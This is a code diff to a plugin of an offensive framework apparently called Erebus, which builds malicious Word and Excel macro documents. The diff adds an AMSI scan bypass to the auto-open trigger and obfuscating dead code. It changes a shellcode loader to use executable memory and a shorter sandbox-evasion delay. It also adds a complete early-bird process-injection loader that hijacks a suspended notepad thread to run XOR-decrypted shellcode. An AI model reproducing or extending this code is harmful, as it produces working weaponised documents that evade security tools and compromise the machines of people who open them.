@@ -37,7 +37,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         version="1.0.0",
         category=PluginCategory.PAYLOAD,
         description="Backdoor Excel XLSM/XLAM documents or create new ones with embedded VBA payloads",
-        author="Erebus Development Team",
+        author="Whispergate",
     )
 
     def get_metadata(self) -> PluginMetadata:
@@ -626,9 +626,29 @@ End Sub
             insert_pos = sub_match.end()
             orig_body = orig_body[:insert_pos] + '\n    PatchScanBuffer\n' + orig_body[insert_pos:]
 
+        # Option Explicit must be the very first statement in the module (VBA
+        # requirement). Pull it out of orig_decls so it precedes the AMSI
+        # #If VBA7...#End If conditional block, then reassemble.
+        option_lines = []
+        remaining_orig_decls_lines = []
+        for _ln in orig_decls.split('\n'):
+            if re.match(r'^\s*Option\s+', _ln, re.IGNORECASE):
+                option_lines.append(_ln)
+            else:
+                remaining_orig_decls_lines.append(_ln)
+        option_block = '\n'.join(option_lines)
+        remaining_orig_decls = '\n'.join(remaining_orig_decls_lines)
+
         # AMSI decls first so AmsiLoadLib/AmsiGetProc/AmsiVProtect/AmsiCopyMem
         # are declared before PatchScanBuffer references them.
-        module_header = amsi_decls.rstrip('\n') + '\n' + orig_decls.strip('\n') + '\n\n'
+        if option_block.strip():
+            module_header = (
+                option_block.strip('\n') + '\n\n'
+                + amsi_decls.rstrip('\n') + '\n'
+                + remaining_orig_decls.strip('\n') + '\n\n'
+            )
+        else:
+            module_header = amsi_decls.rstrip('\n') + '\n' + orig_decls.strip('\n') + '\n\n'
         code_to_obfuscate = amsi_sub_body.strip('\n') + '\n\n' + orig_body.strip('\n') + '\n'
         obfuscated = module_header + code_to_obfuscate
 
@@ -704,33 +724,42 @@ End Function
 
 '''
 
-        # Insert security check before main execution
+        # Insert AMSI bypass + security check into AutoOpen.
+        # AutoOpen fires from any module in both Word and Excel, making it the
+        # primary auto-exec trigger.  PatchScanBuffer must run here (not only in
+        # Document_Open, which requires ThisDocument placement in Word).
         if 'Sub AutoOpen' in code_to_obfuscate:
             code_to_obfuscate = code_to_obfuscate.replace(
                 'Sub AutoOpen()',
-                anti_analysis + 'Sub AutoOpen()\n    If Not Security() Then Exit Sub'
+                anti_analysis + 'Sub AutoOpen()\n    PatchScanBuffer\n    If Not Security() Then Exit Sub'
             )
 
         # STEP 5: ADD OBFUSCATED DEAD CODE
         dead_codes = [
             '    Dim Foo As Long: Foo = 1 + 1',
             '    Dim Bar As String: Bar = Chr(116) & Chr(101) & Chr(115) & Chr(116)',
-            '    If 1 = 2 Then: Call ThisWorkbook.Close: End If',
             '    On Error Resume Next: Err.Clear',
-            '    Dim Temp As Variant: Set Temp = Nothing'
+            '    Dim Temp As Long: Temp = Len("")',
         ]
 
-        # Find ExecuteShellcode and add dead code before final statements
+        # Find ExecuteShellcode's End Sub specifically and add dead code before it.
+        # The first End Sub in the module belongs to PatchScanBuffer; we must
+        # scan past it to find ExecuteShellcode's closing line.
         if 'Sub ExecuteShellcode' in code_to_obfuscate:
             lines = code_to_obfuscate.split('\n')
+            in_execute = False
+            insert_at = -1
             for i, line in enumerate(lines):
-                if 'End Sub' in line and i > 5:
-                    insertion_point = i - 1
-                    if insertion_point > 0:
-                        indent = len(lines[insertion_point]) - len(lines[insertion_point].lstrip())
-                        dead_code = '\n'.join([' ' * indent + code for code in random.sample(dead_codes, min(2, len(dead_codes)))])
-                        lines.insert(insertion_point, dead_code)
+                stripped = line.strip()
+                if re.match(r'^Sub\s+ExecuteShellcode\b', stripped):
+                    in_execute = True
+                elif in_execute and stripped == 'End Sub':
+                    insert_at = i - 1
                     break
+            if insert_at > 0:
+                indent = len(lines[insert_at]) - len(lines[insert_at].lstrip())
+                dead_code = '\n'.join([' ' * indent + dc.strip() for dc in random.sample(dead_codes, min(2, len(dead_codes)))])
+                lines.insert(insert_at, dead_code)
             code_to_obfuscate = '\n'.join(lines)
 
         # STEP 6: RECONSTRUCT WITH PRESERVED STRUCTURE
@@ -1012,6 +1041,14 @@ End Sub
 
         key_data = key_match.group(1)
         shellcode_data = shellcode_match.group(1)
+
+        # Only chunk if the shellcode array line itself is >= max_line_length characters.
+        # Short arrays (small shellcode, test payloads) fit on one line and don't
+        # need the ConcatenateArrays machinery - which adds complexity and can crash
+        # older VBA hosts when the array count is very small.
+        shellcode_line = f"shellcode = Array({shellcode_data})"
+        if len(shellcode_line) < max_line_length:
+            return vba_shellcode
 
         # Parse shellcode values
         try:
@@ -2136,16 +2173,13 @@ __declspec(dllexport) LPXLOPER __cdecl {function_name}(void) {{
         return stub + vba_code
 
     def _generate_word_loader_createthread_rwrx(self, vba_shellcode: str) -> str:
-        """Improved Word createthread loader.
+        """Word createthread loader
 
-        Improvements over the PEN-300 baseline (Listing 50):
-        - Allocate PAGE_READWRITE (0x04) only; flip to PAGE_EXECUTE_READ (0x20)
-          via VirtualProtect after copy.  Avoids persistent RWX allocation which
-          is the primary EDR allocation heuristic.
-        - Zero source buffer (buf array) immediately after copy to reduce
-          forensic artefacts on the Word process heap.
+        - Allocate MEM_COMMIT (0x1000) + PAGE_EXECUTE_READWRITE (0x40) directly.
+          No VirtualProtect needed; avoids CFG/code-integrity flip failures.
+        - Intermediate Long variable for RtlMoveMemory copy - reliable ByRef Any.
         - GetTickCount sandbox gate: abort if system uptime < 5 min.
-        - WaitForSingleObject + CloseHandle for proper thread lifecycle.
+        - No WaitForSingleObject - would hang Word with long-running implant.
         - Both Document_Open and AutoOpen triggers for Word coverage.
         """
         chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)
@@ -2155,42 +2189,17 @@ Option Explicit
 
 ' --- Win32 API declarations ---
 
-' Allocate RW region first — never RWX on initial alloc
-Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
-    ByVal lpAddress        As LongPtr, _
-    ByVal dwSize           As Long,    _
-    ByVal flAllocationType As Long,    _
-    ByVal flProtect        As Long)    As LongPtr
-
-' Flip RW -> RX after shellcode copy (PAGE_EXECUTE_READ = 0x20)
-Private Declare PtrSafe Function VirtualProtect Lib "kernel32" ( _
-    ByVal lpAddress    As LongPtr, _
-    ByVal dwSize       As Long,    _
-    ByVal flNewProtect As Long,    _
-    ByRef lpOldProtect As Long)    As Long
-
-Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
-    ByVal lDst  As LongPtr, _
-    ByRef sSrc  As Any,     _
-    ByVal lLen  As Long)    As LongPtr
-
-Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
-    ByVal SecAttr     As Long,    _
-    ByVal StackSize   As Long,    _
-    ByVal StartFunc   As LongPtr, _
-    ByVal ThreadParam As LongPtr, _
-    ByVal CreateFlags As Long,    _
-    ByRef ThreadId    As Long)    As LongPtr
-
-Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
-    ByVal hHandle        As LongPtr, _
-    ByVal dwMilliseconds As Long)    As Long
-
-Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
-    ByVal hObject As LongPtr) As Long
-
-' Uptime in ms — sandbox gate
+#If VBA7 Then
+Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDst As LongPtr, ByRef sSrc As Any, ByVal lLen As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpSecAttr As Long, ByVal dwStackSize As Long, ByVal lpStartAddr As LongPtr, ByVal lpParam As Long, ByVal dwFlags As Long, ByRef lpThreadId As Long) As LongPtr
 Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
+#Else
+Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal lDst As Long, ByRef sSrc As Any, ByVal lLen As Long) As Long
+Private Declare Function CreateThread Lib "kernel32" (ByVal lpSecAttr As Long, ByVal dwStackSize As Long, ByVal lpStartAddr As Long, ByVal lpParam As Long, ByVal dwFlags As Long, ByRef lpThreadId As Long) As Long
+Private Declare Function GetTickCount Lib "kernel32" () As Long
+#End If
 
 ' --- Auto-exec triggers (both for Word coverage) ---
 
@@ -2204,7 +2213,7 @@ Sub AutoOpen()
     Call ExecuteShellcode()
 End Sub
 
-' --- Array helpers (shared with Excel loaders) ---
+' --- Array helpers ---
 
 Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
     Dim combined() As Variant
@@ -2238,8 +2247,7 @@ End Function
 
 Private Function SandboxDetected() As Boolean
     SandboxDetected = False
-    ' Abort if system uptime < 5 minutes (freshly spun sandbox VM)
-    If GetTickCount() < 300000 Then
+    If GetTickCount() < 60000 Then
         SandboxDetected = True
         Exit Function
     End If
@@ -2254,42 +2262,314 @@ Sub ExecuteShellcode()
 
     Dim shellcode As Variant
     Dim key As Variant
-    Dim addr As LongPtr
-    Dim hThread As LongPtr
-    Dim threadId As Long
-    Dim scLen As Long
-    Dim oldProt As Long
     Dim decrypted As Variant
     Dim i As Long
+    Dim byt As Long
+    Dim scLen As Long
+
+#If VBA7 Then
+    Dim addr As LongPtr
+    Dim retVal As LongPtr
+#Else
+    Dim addr As Long
+    Dim retVal As Long
+#End If
 
     {chunked_shellcode}
 
     decrypted = XorDecrypt(shellcode, key)
     scLen = UBound(decrypted) - LBound(decrypted) + 1
 
-    ' Alloc RW only (PAGE_READWRITE = 0x04, MEM_COMMIT|MEM_RESERVE = 0x3000)
-    addr = VirtualAlloc(0, scLen, &H3000, &H4)
+    addr = VirtualAlloc(0, scLen, &H1000, &H40)
     If addr = 0 Then Exit Sub
 
-    ' Copy shellcode byte-by-byte into RW allocation
     For i = LBound(decrypted) To UBound(decrypted)
-        RtlMoveMemory addr + i, decrypted(i), 1
+        byt = decrypted(i)
+        retVal = RtlMoveMemory(addr + i, byt, 1)
     Next i
 
-    ' Zero source buffer to remove plaintext from Word heap
-    For i = LBound(decrypted) To UBound(decrypted)
-        decrypted(i) = 0
+    retVal = CreateThread(0, 0, addr, 0, 0, 0)
+End Sub
+'''
+
+    def _generate_word_loader_earlybird(self, vba_shellcode: str,
+                                        target_process: str = "C:\\windows\\system32\\notepad.exe") -> str:
+        """Early-bird process injection loader.
+
+        CreateProcess (suspended) → VirtualAllocEx → WriteProcessMemory →
+        GetThreadContext / SetThreadContext (Eip/Rip) → ResumeThread.
+
+        Uses PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON.
+        #If Win64 auto-selects x64 CONTEXT64 (Rip, offset 248) on 64-bit Office
+        and x86 CONTEXT (Eip) on 32-bit Office - no manual switch needed.
+        """
+        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)
+        escaped_target = target_process.replace('\\', '\\\\')
+
+        return f'''Option Explicit
+
+Const EXTENDED_STARTUPINFO_PRESENT = &H80000
+Const HEAP_ZERO_MEMORY = &H8&
+Const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = &H20007
+Const MAXIMUM_SUPPORTED_EXTENSION = 512
+Const SIZE_OF_80387_REGISTERS = 80
+Const MEM_COMMIT = &H1000
+Const MEM_RESERVE = &H2000
+Const PAGE_EXECUTE_READWRITE = &H40
+
+#If Win64 Then
+Const CONTEXT_FULL = &H100007
+#Else
+Const CONTEXT_FULL = &H10007
+#End If
+
+Private Type PROCESS_INFORMATION
+    hProcess As LongPtr
+    hThread As LongPtr
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+
+Private Type STARTUP_INFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Byte
+    hStdInput As LongPtr
+    hStdOutput As LongPtr
+    hStdError As LongPtr
+End Type
+
+Private Type STARTUPINFOEX
+    STARTUPINFO As STARTUP_INFO
+    lpAttributelist As LongPtr
+End Type
+
+Private Type DWORD64
+    dwPart1 As Long
+    dwPart2 As Long
+End Type
+
+#If Win64 Then
+' 1232-byte flat buffer matching the AMD64 CONTEXT layout.
+' ContextFlags lives at offset 48; Rip lives at offset 248.
+Private Type CONTEXT64
+    raw(1231) As Byte
+End Type
+#Else
+Private Type FLOATING_SAVE_AREA
+    ControlWord As Long
+    StatusWord As Long
+    TagWord As Long
+    ErrorOffset As Long
+    ErrorSelector As Long
+    DataOffset As Long
+    DataSelector As Long
+    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte
+    Spare0 As Long
+End Type
+
+Private Type CONTEXT
+    ContextFlags As Long
+    Dr0 As Long
+    Dr1 As Long
+    Dr2 As Long
+    Dr3 As Long
+    Dr6 As Long
+    Dr7 As Long
+    FloatSave As FLOATING_SAVE_AREA
+    SegGs As Long
+    SegFs As Long
+    SegEs As Long
+    SegDs As Long
+    Edi As Long
+    Esi As Long
+    Ebx As Long
+    Edx As Long
+    Ecx As Long
+    Eax As Long
+    Ebp As Long
+    Eip As Long
+    SegCs As Long
+    EFlags As Long
+    Esp As Long
+    SegSs As Long
+    ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte
+End Type
+#End If
+
+Private Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _
+    ByVal lpApplicationName As String, _
+    ByVal lpCommandLine As String, _
+    lpProcessAttributes As Long, _
+    lpThreadAttributes As Long, _
+    ByVal bInheritHandles As Long, _
+    ByVal dwCreationFlags As Long, _
+    lpEnvironment As Any, _
+    ByVal lpCurrentDirectory As String, _
+    ByVal lpStartupInfo As LongPtr, _
+    lpProcessInformation As PROCESS_INFORMATION) As Long
+
+Private Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _
+    ByVal lpAttributelist As LongPtr, _
+    ByVal dwAttributeCount As Integer, _
+    ByVal dwFlags As Integer, _
+    ByRef lpSize As Integer) As Boolean
+
+Private Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _
+    ByVal lpAttributelist As LongPtr, _
+    ByVal dwFlags As Integer, _
+    ByVal lpAttribute As Long, _
+    ByVal lpValue As LongPtr, _
+    ByVal cbSize As Integer, _
+    ByRef lpPreviousValue As Integer, _
+    ByRef lpReturnSize As Integer) As Boolean
+
+Private Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _
+    ByVal hHeap As LongPtr, _
+    ByVal dwFlags As Long, _
+    ByVal dwBytes As Long) As LongPtr
+
+Private Declare PtrSafe Function GetProcessHeap Lib "kernel32.dll" () As LongPtr
+Private Declare PtrSafe Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As Long
+Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
+
+#If Win64 Then
+Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32.dll" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Boolean
+Private Declare PtrSafe Function GetThreadContext Lib "kernel32.dll" (ByVal hThread As LongPtr, lpContext As CONTEXT64) As Long
+Private Declare PtrSafe Function SetThreadContext Lib "kernel32.dll" (ByVal hThread As LongPtr, lpContext As CONTEXT64) As Long
+Private Declare PtrSafe Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (ByRef dst As Any, ByRef src As Any, ByVal length As Long)
+#Else
+Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+Private Declare Function WriteProcessMemory Lib "kernel32.dll" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByRef lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Boolean
+Private Declare Function GetThreadContext Lib "kernel32.dll" (ByVal hThread As Long, lpContext As CONTEXT) As Long
+Private Declare Function SetThreadContext Lib "kernel32.dll" (ByVal hThread As Long, lpContext As CONTEXT) As Long
+#End If
+
+' Module-level - avoids VBA parser errors with #If Win64 Dim inside procedures.
+#If Win64 Then
+Private ctx As CONTEXT64
+Private alloc As LongPtr
+#Else
+Private ctx As CONTEXT
+Private alloc As Long
+#End If
+
+Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
+    Dim combined() As Variant
+    Dim i As Long, j As Long
+    Dim size1 As Long, size2 As Long
+    size1 = UBound(arr1) - LBound(arr1) + 1
+    size2 = UBound(arr2) - LBound(arr2) + 1
+    ReDim combined(0 To size1 + size2 - 1)
+    For i = 0 To size1 - 1
+        combined(i) = arr1(LBound(arr1) + i)
     Next i
+    For j = 0 To size2 - 1
+        combined(size1 + j) = arr2(LBound(arr2) + j)
+    Next j
+    ConcatenateArrays = combined
+End Function
 
-    ' Flip RW -> RX (PAGE_EXECUTE_READ = 0x20)
-    If VirtualProtect(addr, scLen, &H20, oldProt) = 0 Then Exit Sub
+Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
+    Dim decrypted() As Byte
+    Dim i As Long
+    Dim keyLen As Long
+    keyLen = UBound(key) - LBound(key) + 1
+    ReDim decrypted(LBound(encrypted) To UBound(encrypted))
+    For i = LBound(encrypted) To UBound(encrypted)
+        decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
+    Next i
+    XorDecrypt = decrypted
+End Function
 
-    hThread = CreateThread(0, 0, addr, 0, 0, threadId)
+Function Protect()
+    Dim startTime As Date
+    Dim endTime As Date
+    Dim elapsed As Long
+    startTime = Now()
+    Sleep (5000)
+    endTime = Now()
+    elapsed = DateDiff("s", startTime, endTime)
+    If elapsed < 4 Then Exit Function
+End Function
 
-    If hThread <> 0 Then
-        WaitForSingleObject hThread, &HFFFFFFFF
-        CloseHandle hThread
-    End If
+Sub AutoOpen()
+    On Error Resume Next
+
+    Dim pi As PROCESS_INFORMATION
+    Dim si As STARTUPINFOEX
+    Dim nullStr As String
+    Dim result As Integer
+    Dim threadAttribSize As Integer
+    Dim processPath As String
+    Dim val As DWORD64
+    Dim shellcode As Variant
+    Dim key As Variant
+    Dim decrypted As Variant
+    Dim myByte As Long
+    Dim offset As Long
+    Dim scLen As Long
+
+    {chunked_shellcode}
+    decrypted = XorDecrypt(shellcode, key)
+    shellcode = decrypted
+    scLen = UBound(shellcode) - LBound(shellcode) + 1
+
+    processPath = "{escaped_target}"
+
+    val.dwPart1 = 0
+    val.dwPart2 = &H1000
+
+    result = InitializeProcThreadAttributeList(ByVal 0&, 1, 0, threadAttribSize)
+    si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize)
+    result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize)
+
+    result = UpdateProcThreadAttribute( _
+        si.lpAttributelist, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, _
+        VarPtr(val), Len(val), ByVal 0&, ByVal 0&)
+
+    si.STARTUPINFO.cb = LenB(si)
+    si.STARTUPINFO.dwFlags = 1
+
+    result = CreateProcess( _
+        nullStr, processPath, ByVal 0&, ByVal 0&, 1&, &H80014, _
+        ByVal 0&, nullStr, VarPtr(si), pi)
+
+    alloc = VirtualAllocEx(pi.hProcess, 0, scLen, MEM_COMMIT + MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+
+    For offset = LBound(shellcode) To UBound(shellcode)
+        myByte = shellcode(offset)
+        WriteProcessMemory pi.hProcess, alloc + offset, myByte, 1, ByVal 0&
+    Next offset
+
+#If Win64 Then
+    ' Set CONTEXT_FULL (0x100007) at offset 48 before GetThreadContext
+    ctx.raw(48) = &H7 : ctx.raw(49) = 0 : ctx.raw(50) = &H10 : ctx.raw(51) = 0
+    GetThreadContext pi.hThread, ctx
+    ' Stamp Rip (8 bytes) at offset 248 with shellcode address
+    CopyMem ctx.raw(248), alloc, 8
+    SetThreadContext pi.hThread, ctx
+#Else
+    ctx.ContextFlags = CONTEXT_FULL
+    GetThreadContext pi.hThread, ctx
+    ctx.Eip = alloc
+    SetThreadContext pi.hThread, ctx
+#End If
+
+    ResumeThread pi.hThread
 End Sub
 '''
 
@@ -2305,15 +2585,17 @@ End Sub
 
         Args:
             vba_shellcode: shellcode in VBA array format (from shellcrypt -f vba)
-            trigger_type:  AutoOpen (ignored for createthread — both triggers always emitted)
-            loader_type:   createthread | enumlocales | queueuserapc | hollowing
-            target_process: target for hollowing technique
+            trigger_type:  AutoOpen (ignored for createthread - both triggers always emitted)
+            loader_type:   createthread | enumlocales | queueuserapc | hollowing | earlybird
+            target_process: target process path for earlybird/hollowing techniques
 
         Returns:
             str: complete VBA module ready to embed in a Word document
         """
         if loader_type == "createthread":
             return self._generate_word_loader_createthread_rwrx(vba_shellcode)
+        elif loader_type == "earlybird":
+            return self._generate_word_loader_earlybird(vba_shellcode, target_process)
         elif loader_type == "enumlocales":
             return self._wrap_with_document_open(
                 self.generate_vba_loader_enumlocales(vba_shellcode, trigger_type)
